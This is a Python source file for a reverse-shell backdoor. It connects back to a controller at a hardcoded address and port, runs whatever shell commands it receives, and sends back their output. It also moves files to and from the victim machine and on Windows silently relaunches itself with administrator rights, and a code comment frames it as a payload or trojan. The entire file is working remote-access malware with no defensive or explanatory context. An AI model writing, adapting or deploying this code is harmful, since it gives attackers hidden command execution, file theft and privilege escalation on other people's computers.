import socket
import time
import subprocess
import json
import os
import sys
import ctypes

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def connection():
    while True:
        time.sleep(1)
        try:
            s.connect(('127.0.0.1', 5555))
            shell()
            s.close()
            break
        except:
            connection()

def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())

def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

def elevate_privileges():
    try:
        if os.name == 'nt':

            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 0) 
            #(Parent Windows, runas admin, Path to Python exec (can be Payload, Torjan, etc.), Path to current Python, None = work in current Dir, 0 = Hide and 1 = Show normally)
            
            return "Privileges elevated successfully."
        else:
            return "Privilege elevation not supported on this platform."
    except Exception as e:
        return str(e)

def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command == 'elevate':
            result = elevate_privileges()
            reliable_send(result)
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()